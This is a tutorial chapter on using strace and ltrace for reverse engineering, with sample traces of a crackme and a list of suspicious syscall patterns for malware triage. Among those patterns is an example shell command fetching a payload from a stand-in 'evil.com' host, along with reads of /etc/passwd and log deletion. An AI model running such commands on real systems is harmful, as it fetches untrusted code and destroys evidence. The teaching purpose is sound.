🔝 Back to [Table of Contents](/TABLE-OF-CONTENTS.md)
# 5.5 — `strace` / `ltrace` — system calls and library calls (syscall vs libc)

> **Chapter 5 — Basic binary inspection tools**  
> **Part II — Static Analysis**

---

## Introduction

So far, all our analyses have been **static**: we inspected the binary without ever running it. `file`, `strings`, `readelf`, `nm`, `ldd` — all of these tools merely read the file on disk. That is intentional: static analysis is safe and reproducible. But it has a fundamental limit — it cannot tell us what the program **actually does** at runtime.

A binary can contain dead code, conditional execution paths, code decrypted on the fly, or behaviors triggered only by certain inputs. To observe actual behavior, you have to let the program run — under supervision.

`strace` and `ltrace` are **dynamic tracing** tools that let you observe a running program without modifying it and without using a debugger. They respectively intercept the **system calls** (the interface between the program and the Linux kernel) and the **shared-library calls** (libc and other `.so` functions), and log them in real time.

> ⚠️ **Reminder**: unlike the tools of the previous sections, `strace` and `ltrace` **execute the binary**. Never use them on a suspicious binary outside an isolated sandbox (Chapter 26).

---

## Syscalls vs library calls — clarifying the distinction

Before diving into the tools, it is essential to understand the difference between these two interface levels, because it determines the choice between `strace` and `ltrace`.

### System calls (syscalls)

A system call is a request made directly to the **Linux kernel**. It is the only way for a user-space program to interact with the hardware and the system resources: opening a file, allocating memory, communicating over the network, creating a process, and so on.

On x86-64 Linux, a syscall is triggered by the `syscall` machine instruction. The syscall number is placed in the `rax` register, and the arguments in `rdi`, `rsi`, `rdx`, `r10`, `r8`, `r9` (different convention from the System V ABI for normal functions — `rcx` is replaced by `r10` because `syscall` uses `rcx` internally).

There are roughly 450 syscalls on a recent Linux kernel. The most common in RE are: `read`, `write`, `open`/`openat`, `close`, `mmap`, `mprotect`, `brk`, `ioctl`, `socket`, `connect`, `sendto`, `recvfrom`, `clone`, `execve`, `exit_group`.

### Library calls (libc and others)

The vast majority of programs do **not** make syscalls directly. They use standard C library (libc) functions that internally perform the syscalls for them. For example:

| libc function | Underlying syscall(s) |  
|---|---|  
| `fopen("file.txt", "r")` | `openat(AT_FDCWD, "file.txt", O_RDONLY)` |  
| `printf("Hello %s\n", name)` | `write(1, "Hello World\n", 12)` |  
| `malloc(1024)` | `brk()` or `mmap()` (depending on size) |  
| `strcmp(a, b)` | *(none — runs entirely in user space)* |  
| `getaddrinfo(host, ...)` | `socket()`, `connect()`, `sendto()`, `recvfrom()` |

The relationship is not always one-to-one. A single libc function can spawn several syscalls (like `getaddrinfo`, which performs DNS resolution via sockets). Conversely, some libc functions make no syscall (`strcmp`, `strlen`, `memcpy` — they are pure in-memory user-space operations).

### Which tool for which level?

| Tool | What it intercepts | Level | What it does not see |  
|---|---|---|---|  
| `strace` | System calls (`syscall`) | Kernel interface | Pure user-space functions (`strcmp`, `strlen`) |  
| `ltrace` | Shared-library calls | libc/.so interface | Direct syscalls (bypassing any library) |

In practice, you often use both as complements. `strace` gives the "low" view (what does the program do at the OS level?), `ltrace` gives the "high" view (which library functions does it call, with which arguments?).

---

## `strace` — tracing system calls

### How it works

`strace` uses the `ptrace` mechanism of the Linux kernel — the same one used by debuggers like GDB. It attaches to the target process and intercepts every transition between user mode and kernel mode (every syscall). For each call, it prints the syscall name, its arguments, and its return value.

### Basic usage

```bash
$ strace ./keygenme_O0
execve("./keygenme_O0", ["./keygenme_O0"], 0x7ffc8a2e0e10 /* 58 vars */) = 0  
brk(NULL)                               = 0x556e3a4c5000  
arch_prctl(0x3001, 0x7ffd1a2c4100)      = -1 EINVAL (Invalid argument)  
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f4a3c8f0000  
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)  
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3  
fstat(3, {st_mode=S_IFREG|0644, st_size=98547, ...}) = 0  
mmap(NULL, 98547, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f4a3c8d7000  
close(3)                                = 0  
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3  
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0"..., 832) = 832  
[...]
write(1, "Enter your license key: ", 24Enter your license key: ) = 24  
read(0, ABCD-1234-EFGH-5678  
"ABCD-1234-EFGH-5678\n", 1024) = 21
write(1, "Checking key...\n", 17Checking key...
)       = 17
write(1, "Access denied. Invalid key.\n", 28Access denied. Invalid key.
) = 28
exit_group(1)                           = ?
+++ exited with 1 +++
```

The output is bulky — even this simple program produces dozens of syscalls. Let's analyze the visible phases:

**Initialization phase (dynamic loader)** — the first syscalls (`brk`, `mmap`, `access`, `openat` on `/etc/ld.so.cache` and `libc.so.6`) correspond to the dynamic loader loading the shared libraries. We can recognize exactly the resolution mechanism described in section 5.4: the loader consults `/etc/ld.so.cache`, then opens `libc.so.6` and maps it into memory via `mmap`. This phase is identical for every dynamically linked binary and can be filtered out.

**Application phase** — this is where the program does its work:  
- `write(1, "Enter your license key: ", 24)` — write to standard output (fd 1). That is the `printf` or `puts` from the source code.  
- `read(0, ..., 1024)` — read from standard input (fd 0). The program waits for user input. We see the buffer is 1024 bytes long.  
- `write(1, "Checking key...\n", 17)` — display of the checking message.  
- `write(1, "Access denied. Invalid key.\n", 28)` — the verification result.  
- `exit_group(1)` — the program ends with return code 1 (failure).

Note that `strcmp` appears **nowhere** in the `strace` output. That is normal: `strcmp` is a purely user-space function that compares bytes in memory without ever calling the kernel. To see `strcmp`, you need `ltrace`.

### Output format

Each line follows a constant format:

```
syscall_name(arguments...) = return_value
```

When a syscall fails, the return value is `-1` followed by the error code and its textual description:

```
access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
```

Arguments are shown in readable form: flags are broken down into symbolic constants (`O_RDONLY|O_CLOEXEC`), pointers to buffers are followed by their content in quotes, structures are expanded in braces.

### Essential options for RE

**Filter by syscall category: `-e trace=`**

`strace`'s raw output is often buried in the noise of initialization. Category filtering is essential:

```bash
# Only file-related syscalls
$ strace -e trace=file ./keygenme_O0
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT  
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3  
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3  

# Only network syscalls (sockets)
$ strace -e trace=network ./network_binary
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3  
connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.1.100")}, 16) = 0  
sendto(3, "AUTH user123\n", 13, 0, NULL, 0) = 13  
recvfrom(3, "OK\n", 1024, 0, NULL, NULL) = 3  

# Only process-management syscalls
$ strace -e trace=process ./binary
clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|...) = 12345  
execve("/bin/sh", ["sh", "-c", "echo pwned"], ...) = 0  

# Only memory syscalls
$ strace -e trace=memory ./binary
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f...  
mprotect(0x7f..., 4096, PROT_READ) = 0  

# Trace one or several specific syscalls
$ strace -e trace=read,write ./keygenme_O0
```

The most useful filter categories:

| Category | Syscalls covered | RE use case |  
|---|---|---|  
| `file` | `open`, `openat`, `stat`, `access`, `unlink`… | Which files does the binary read/write/delete? |  
| `network` | `socket`, `connect`, `bind`, `send`, `recv`… | Who does it communicate with? On which port? |  
| `process` | `fork`, `clone`, `execve`, `wait`, `kill`… | Does it spawn other processes? Does it run commands? |  
| `memory` | `mmap`, `mprotect`, `brk`, `munmap`… | How does it manage memory? Does it change permissions? |  
| `signal` | `rt_sigaction`, `rt_sigprocmask`, `kill`… | Which signals does it catch? |  
| `read` / `write` | Literally `read` and `write` | What data goes through the file descriptors? |

**Display full strings: `-s`**

By default, `strace` truncates string arguments to 32 characters. For RE, this is often not enough:

```bash
# Increase the maximum string length displayed
$ strace -s 256 ./keygenme_O0

# Or to miss nothing:
$ strace -s 9999 ./keygenme_O0
```

**Measure time spent in each syscall: `-T` and `-c`**

```bash
# Display each syscall's duration (in seconds, between < >)
$ strace -T ./keygenme_O0
read(0, "test\n", 1024)                 = 5 <4.271282>

# Aggregated stats: how many times each syscall is called
$ strace -c ./keygenme_O0
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
 42.86    0.000003           1         3           write
 28.57    0.000002           2         1           read
 14.29    0.000001           0         4           mmap
 14.29    0.000001           0         3         1 access
  0.00    0.000000           0         3           close
  0.00    0.000000           0         3           openat
  [...]
------ ----------- ----------- --------- --------- ----------------
100.00    0.000007           0        42         3 total
```

The `-c` option is particularly useful for getting a fast **behavioral profile**: a program that makes hundreds of `sendto`/`recvfrom` is clearly network-oriented; a program with thousands of `read`/`write` on files does heavy I/O; a program with many `mmap`/`mprotect` calls changes its own memory permissions, which can indicate self-modifying code or an unpacker.

**Attach to an existing process: `-p`**

```bash
# Trace an existing process by its PID
$ strace -p 12345

# Handy with pgrep
$ strace -p $(pgrep keygenme)
```

**Follow child processes: `-f`**

```bash
# If the program does fork() or execve(), trace children too
$ strace -f ./binary_that_forks
```

Without `-f`, only the parent process is traced. Programs that detach (daemons), launch shell commands (`system()`, `execve`), or create threads via `clone()` require this option.

**Redirect the output to a file: `-o`**

```bash
# strace output goes to the file, the program's output stays visible
$ strace -o trace.log ./keygenme_O0
Enter your license key: test  
Checking key...  
Access denied. Invalid key.  

$ cat trace.log
execve("./keygenme_O0", ["./keygenme_O0"], 0x7ffc... /* 58 vars */) = 0
[...]
```

Without `-o`, `strace` writes to stderr, which mixes with the program's output and makes interaction difficult. The `-o` option is almost indispensable for interactive programs.

### Identifying suspicious behavior with `strace`

In malware analysis (Part VI), certain syscall patterns are red flags:

```bash
# The binary opens files in /etc or /proc
openat(AT_FDCWD, "/etc/passwd", O_RDONLY) = 3  
openat(AT_FDCWD, "/proc/self/status", O_RDONLY) = 4  # anti-debug  

# The binary establishes an outgoing network connection
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3  
connect(3, {sa_family=AF_INET, sin_port=htons(4444),  
            sin_addr=inet_addr("10.0.0.1")}, 16) = 0

# The binary makes a memory region executable (unpacking? shellcode?)
mprotect(0x7f4a3c000000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC) = 0

# The binary deletes files
unlinkat(AT_FDCWD, "/tmp/evidence.log", 0) = 0

# The binary executes a shell command
execve("/bin/sh", ["sh", "-c", "curl http://evil.com/payload"], ...) = 0
```

Each of these patterns deserves deeper investigation. `strace` reveals them without any prior knowledge of the binary.

---

## `ltrace` — tracing library calls

### How it works

`ltrace` intercepts calls to shared-library functions — mainly libc, but also any other `.so` linked to the binary. It works by instrumenting the PLT (Procedure Linkage Table): it temporarily replaces PLT entries with trampolines that log the call before forwarding it to the real function.

### Basic usage

```bash
$ ltrace ./keygenme_O0
puts("Enter your license key: ")                     = 25  
read(0, "ABCD-1234-EFGH-5678\n", 1024)               = 21  
strlen("ABCD-1234-EFGH-5678")                         = 19  
strcmp("ABCD-1234-EFGH-5678", "K3Y9-AX7F-QW2M-PL8N") = -1  
puts("Access denied. Invalid key.")                   = 29  
+++ exited (status 1) +++
```

The difference from `strace` is immediately visible. Where `strace` showed us anonymous `write(1, ...)` and `read(0, ...)` calls, `ltrace` shows us the high-level calls as the programmer wrote them: `puts`, `strlen`, `strcmp`.

And above all — look at the `strcmp` line: `ltrace` displays the **two arguments** of the comparison. We see that the program compares the user input `"ABCD-1234-EFGH-5678"` with the expected key `"K3Y9-AX7F-QW2M-PL8N"`. In a single `ltrace` execution, with no disassembly, no debugger, no Ghidra, we found the key. The crackme is solved.

That is the power — and fragility — of `ltrace`. It is devastating on programs that use standard library functions for their sensitive operations. But a program that implements its own comparison routine (without calling `strcmp`) or encrypts its strings in memory will completely escape `ltrace`.

### Output format

Each line follows the format:

```
function_name(arguments...) = return_value
```

Arguments are shown readably: strings in quotes, integers in decimal, pointers in hexadecimal. Return values follow each function's semantics (`strcmp` returns 0 if equal, negative or positive otherwise; `strlen` returns the length; etc.).

### Essential options for RE

**Filter traced functions: `-e`**

```bash
# Trace only strcmp and strlen
$ ltrace -e strcmp+strlen ./keygenme_O0
strlen("ABCD-1234-EFGH-5678")                         = 19  
strcmp("ABCD-1234-EFGH-5678", "K3Y9-AX7F-QW2M-PL8N") = -1  
+++ exited (status 1) +++

# Trace every function whose name contains "str"
$ ltrace -e '*str*' ./keygenme_O0

# Trace memory-allocation functions
$ ltrace -e malloc+free+calloc+realloc ./program
malloc(256)                              = 0x556e3a4c5260  
malloc(1024)                             = 0x556e3a4c5370  
free(0x556e3a4c5260)                     = <void>  
```

**Also trace syscalls: `-S`**

```bash
# Combine library and syscall tracing
$ ltrace -S ./keygenme_O0
SYS_brk(0)                               = 0x556e3a4c5000  
SYS_mmap(0, 8192, 3, 34, -1, 0)          = 0x7f4a3c8f0000  
[...]
puts("Enter your license key: ")         = 25  
SYS_write(1, "Enter your license key: ", 24) = 24  
SYS_read(0, "test\n", 1024)              = 5  
strlen("test")                            = 4  
strcmp("test", "K3Y9-AX7F-QW2M-PL8N")    = 1  
puts("Access denied. Invalid key.")      = 29  
SYS_write(1, "Access denied. Invalid key.\n", 28) = 28  
```

With `-S`, you see both levels simultaneously: the libc call (`puts`) followed by the underlying syscall (`SYS_write`). It is excellent for understanding the correspondence between the two layers.

**Display full strings: `-s`**

```bash
# As with strace, increase the maximum string length displayed
$ ltrace -s 256 ./keygenme_O0
```

**Trace a specific library: `-l`**

```bash
# Trace only calls to libcrypto
$ ltrace -l libcrypto.so.3 ./crypto_binary
EVP_CIPHER_CTX_new()                     = 0x55a3b2c40100  
EVP_EncryptInit_ex(0x55a3b2c40100, 0x7f..., NULL, "mysecretkey12345", "iv1234567890abcd") = 1  
EVP_EncryptUpdate(0x55a3b2c40100, 0x55a3b2c40200, [32], "plaintext data here!", 20) = 1  
EVP_EncryptFinal_ex(0x55a3b2c40100, 0x55a3b2c40220, [12]) = 1  
```

This example illustrates `ltrace`'s power on a binary using OpenSSL: you see the encryption key, the IV, and the plaintext in clear in the arguments. That is exactly the information Chapter 24 (section 24.3) will seek to extract with more sophisticated tools — but sometimes `ltrace` is enough.

**Redirect to a file and follow children:**

```bash
$ ltrace -o ltrace.log -f ./program
```

The `-o` and `-f` options work the same as their `strace` counterparts.

### `ltrace` limitations

`ltrace` has several important limitations to keep in mind:

**Statically linked binaries** — `ltrace` instruments the PLT, which only exists in dynamically linked binaries. On a static binary, `ltrace` intercepts nothing.

**Stripped and optimized binaries** — `ltrace` works normally on stripped binaries (it instruments the PLT, which survives stripping). On the other hand, if the compiler inlined library functions (for example, GCC can replace `strcmp` with direct comparison instructions at `-O2`/`-O3`), the call no longer goes through the PLT and `ltrace` does not see it.

**Full RELRO** — with Full RELRO enabled, the GOT is read-only after initialization. Some versions of `ltrace` may have trouble with this mechanism, because they need to modify PLT/GOT entries to set their hooks. Recent versions generally handle this case, but it is a potential source of issues.

**Internal functions** — `ltrace` only traces calls going through the PLT, i.e., shared-library functions. Functions defined within the binary itself (`check_license`, `generate_expected_key`) are not intercepted. To trace internal functions, you need a debugger (GDB, Chapter 11) or a dynamic-instrumentation tool (Frida, Chapter 13).

**Architectural compatibility** — `ltrace` is less actively maintained than `strace` and can have issues on certain architectures or with certain glibc versions. If `ltrace` produces inconsistent results or segfaults, try Frida as an alternative.

---

## `strace` vs `ltrace` — choice guide

The choice between the two tools depends on the question you are asking:

| Question | Tool | Why |  
|---|---|---|  
| Which files does the program open? | `strace -e trace=file` | File opening is a syscall (`openat`). |  
| Which server does it communicate with? | `strace -e trace=network` | Sockets are syscalls. |  
| Which string is compared with the input? | `ltrace -e strcmp` | `strcmp` is a libc function. |  
| Which encryption key is used? | `ltrace -l libcrypto*` | OpenSSL functions are in a shared library. |  
| Does the program fork? | `strace -e trace=process -f` | `fork`/`clone` are syscalls. |  
| How much memory is allocated? | `ltrace -e malloc+free` | `malloc` is a libc function. |  
| Does the program change its memory permissions? | `strace -e trace=memory` | `mprotect` is a syscall. |  
| Which arguments does it pass to `printf`? | `ltrace -e printf` | `printf` is a libc function. |

When in doubt, run both: `strace -o strace.log` and `ltrace -o ltrace.log` in two terminals (or one after the other). The two logs naturally complement each other.

---

## Advanced tracing techniques

### Capturing network buffers with `strace`

For a network binary, `strace` can capture the exact content of each exchange:

```bash
$ strace -e trace=network,read,write -s 4096 -x -o net_trace.log ./network_binary
```

The `-x` option displays strings in hexadecimal, which is essential for binary protocols (non-ASCII). You obtain the exact frames sent and received, which is the starting point of protocol reversing (Chapter 23).

### Counting and profiling calls

```bash
# Statistical profile of syscalls
$ strace -c ./keygenme_O0 <<< "test"
% time     seconds  usecs/call     calls    errors syscall
------ ----------- ----------- --------- --------- ----------------
  0.00    0.000000           0         3           write
  0.00    0.000000           0         1           read
  0.00    0.000000           0         7           mmap
  [...]

# Statistical profile of libc calls
$ ltrace -c ./keygenme_O0 <<< "test"
% time     seconds  usecs/call     calls      function
------ ----------- ----------- --------- --------------------
 38.46    0.000005           5         1 strcmp
 23.08    0.000003           3         1 strlen
 23.08    0.000003           1         2 puts
 15.38    0.000002           2         1 read
------ ----------- ----------- --------- --------------------
100.00    0.000013                     5 total
```

`-c` profiles are an excellent triage tool to understand a program's overall behavior before diving into the details.

### Tracing with timestamps

```bash
# Relative timestamp (since the start of execution)
$ strace -r ./keygenme_O0
     0.000000 execve("./keygenme_O0", ...) = 0
     0.000412 brk(NULL)                    = 0x556e3a4c5000
     [...]
     0.001523 write(1, "Enter your license key: ", 24) = 24
     4.271282 read(0, "test\n", 1024)      = 5
     0.000089 write(1, "Checking key...\n", 17) = 17
     0.000034 write(1, "Access denied...\n", 28) = 28

# Absolute timestamp (system clock)
$ strace -t ./keygenme_O0
14:23:45 execve("./keygenme_O0", ...) = 0
[...]

# High-precision timestamp (microseconds)
$ strace -tt ./keygenme_O0
14:23:45.123456 execve("./keygenme_O0", ...) = 0
```

The relative timestamp (`-r`) is particularly useful to spot unusual latencies. A 4-second delay before the `read` corresponds to the user typing time. But an unexplained delay between two syscalls can indicate a costly computation, an intentional `sleep` (timing-based anti-debug technique), or a network wait.

---

## What to remember going forward

- **`strace` shows the interface between the program and the kernel**. Every interaction with the outside world (files, network, processes, memory) goes through a syscall that `strace` intercepts. It is the tool of choice to understand a program's side effects.  
- **`ltrace` shows the interface between the program and its libraries**. It reveals library-function arguments, which are often more readable and more directly useful than raw syscalls. On a naive crackme, `ltrace` can solve the challenge in a single execution.  
- **`strace -e trace=...`** is your main filter. Learn the `file`, `network`, `process`, `memory` categories — they cover 90% of needs.  
- **`ltrace -e strcmp`** is the classic reflex in front of a crackme. If the comparison goes through `strcmp`, you will see both strings in the clear.  
- **Both tools execute the binary** — never use them outside a sandbox on an untrusted binary.  
- **Limitations**: `strace` does not see pure user-space operations; `ltrace` does not see direct syscalls or internal functions. For full coverage, complement them with GDB (Chapter 11) and Frida (Chapter 13).

---


⏭️ [`checksec` — binary protection inventory (ASLR, PIE, NX, canary, RELRO)](/05-basic-inspection-tools/06-checksec.md)
